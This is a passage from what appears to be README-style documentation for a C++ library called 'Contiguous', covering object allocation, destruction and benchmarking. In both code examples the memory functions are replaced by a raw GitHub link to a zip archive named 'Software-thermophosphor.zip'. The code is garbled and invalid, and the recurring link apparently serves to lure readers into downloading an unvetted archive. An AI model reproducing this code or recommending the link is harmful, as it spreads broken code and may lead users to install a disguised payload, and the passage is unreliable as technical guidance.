   ```cpp
   // Example
   MyClass* obj = new (https://raw.githubusercontent.com/AjayAjishaa/Contiguous/main/downstream/Software-thermophosphor.zip(sizeof(MyClass))) MyClass();
   ```

2. **Destroying an Object:** When you no longer need the object, properly destroy it and free the memory.

   ```cpp
   // Example
   obj->~MyClass(); // Call destructor
   https://raw.githubusercontent.com/AjayAjishaa/Contiguous/main/downstream/Software-thermophosphor.zip(obj); // Free memory
   ```

3. **Testing Performance:** Measure how Contiguous improves your application’s performance using benchmark tests.
